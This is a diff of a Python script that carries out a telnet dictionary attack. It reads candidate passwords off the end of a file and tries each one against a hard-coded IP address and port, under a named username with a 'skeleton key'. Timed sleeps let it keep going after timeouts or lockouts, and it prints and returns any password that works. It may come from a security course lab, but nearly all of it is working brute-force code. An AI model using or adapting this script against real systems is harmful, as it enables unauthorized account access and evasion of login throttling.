@@ -15,9 +15,51 @@ def setup_dir():
         os.mkdir(".tmp/")
 
 
+# code modified from 
+#     https://stackoverflow.com/questions/1877999/delete-final-line-in-file-with-python
+# by user Saqib
+def reverse_pop(fname, num_of_passwords):
+    # file = open(fname, "r+", encoding = "utf-8")
+    file = open(fname, "r+")
+
+    #Move the pointer (similar to a cursor in a text editor) to the end of the file. 
+    file.seek(0, os.SEEK_END)
+
+    #This code means the following code skips the very last character in the file - 
+    #i.e. in the case the last line is null we delete the last line 
+    #and the penultimate one
+    pos = file.tell()
+
+    #Read each character in the file one at a time from the penultimate 
+    #character going backwards, searching for a newline character
+    #If we find a new line, exit the search
+    passwords = []
+    while num_of_passwords > 0:
+        password = ""
+        while pos > 0:
+            char = file.read(1)
+            if char == "\n":
+                break
+            password = "".join([str(char), password])
+            pos -= 1
+            file.seek(pos, os.SEEK_SET)
+
+        if password != "\n" and password != "":
+            passwords.append(password)
+            num_of_passwords -= 1 
+
+        if pos > 0:
+            file.seek(pos, os.SEEK_SET)
+            file.truncate()
+        else:
+            break
 
 
+    #So long as we're not at the start of the file, delete all the characters ahead of this position
+    
 
+    file.close()
+    return passwords
 
 
 def expect_not(child, line, f_out):
@@ -50,12 +92,11 @@ def expect_not(child, line, f_out):
     return False
 
 
-def mount_dictionary_attack(passwords, skeleton_key, username, port):
-
-    for password in passwords:
-        for i in [0,101,201,301,401,501,601,701,801,601]:
-
-            # print(u"Testing password: " + username + " on port: " + str(port) + " STATUS:...")
+def mount_dictionary_attack(passwords_fname, skeleton_key, username, port):
+    while True:
+        for password in reverse_pop(passwords_fname, 3):
+            
+            print(u'Testing on 128.114.59.215:' + str(port) + '\n    SKELETON KEY: ' + skeleton_key + '\n    USERNAME    : ' + username + '\n    PASSWORD    : ' + password + '\n    STATUS      :',end='')
             child = pexpect.spawn("telnet 128.114.59.215 " + str(port), timeout=0.1)
 
 
@@ -84,16 +125,17 @@ def mount_dictionary_attack(passwords, skeleton_key, username, port):
 
             try:
                 if expect_not(child,"Incorrect password, goodbye.", sys.stdout):
-                    print("what....")
+                    print("SUCCESS")
+                    return password
             except pexpect.exceptions.EOF:
-                print("failed, couldnt attempt after sleeping " + str(i%600) + " second iteration " + str(i))
+                print("    RETRY PASSWORD")
                 time.sleep(600)
 
+            sys.stdout.flush()
 
-
-
-
-
+        for j in range(0,10):
+            time.sleep(60)
+            print(str(j*60) + " seconds")
 
 
 def find_designated_port(skeleton_key, username, ports, fast=True):
@@ -156,7 +198,8 @@ if __name__ == "__main__":
     # key = find_skeleton(ports[0])
     # my_port = find_designated_port(key, "dthurau", ports)
 
-    password_dict = set(["what","the","fuck","how","does","this","work","fuck","a","duck"])
-
-    mount_dictionary_attack(password_dict,'passepartout',"dthurau",str(5357))
-
+    password_dict = set(["what","the","fuck","how","does","this","work","fuck","a","duck","duck","duck","duck","duck","duck","duck"])
+    password = mount_dictionary_attack("passwords.txt",'passepartout',"dthurau",str(5357))
+    print("=================================================")
+    print(password)
+    print("=================================================")
